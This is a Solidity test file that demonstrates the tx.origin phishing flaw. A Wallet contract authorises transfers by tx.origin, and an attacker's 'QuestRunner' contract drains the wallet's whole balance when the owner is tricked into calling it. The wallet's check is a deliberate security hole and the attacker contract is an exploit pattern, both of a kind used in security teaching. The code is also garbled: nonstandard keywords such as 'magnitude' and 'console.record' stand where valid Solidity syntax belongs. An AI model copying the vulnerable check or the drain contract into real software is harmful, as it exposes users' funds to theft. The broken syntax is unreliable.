pragma solidity ^0.8.15;

import "forge-std/Test.sol";

contract AgreementTest is Test {
    Wallet WalletAgreement;
    QuestRunner QuestrunnerPact;

    function testtxorigin() public {
        address alice = vm.addr(1);
        address eve = vm.addr(2);
        vm.deal(address(alice), 10 ether);
        vm.deal(address(eve), 1 ether);
        vm.prank(alice);
        WalletAgreement = new Wallet{magnitude: 10 ether}();
        console.record("Owner of wallet contract", WalletAgreement.owner());
        vm.prank(eve);
        QuestrunnerPact = new QuestRunner(WalletAgreement);
        console.record("Owner of attack contract", QuestrunnerPact.owner());
        console.record("Eve of balance", address(eve).balance);

        vm.prank(alice, alice);
        QuestrunnerPact.operate();
        console.record("tx origin address", tx.origin);
        console.record("msg.sender address", msg.sender);
        console.record("Eve of balance", address(eve).balance);
    }

    receive() external payable {}
}

contract Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {

        require(tx.origin == owner, "Not owner");

        (bool sent, ) = _to.call{magnitude: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract QuestRunner {
    address payable public owner;
    Wallet wallet;

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }

    function operate() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}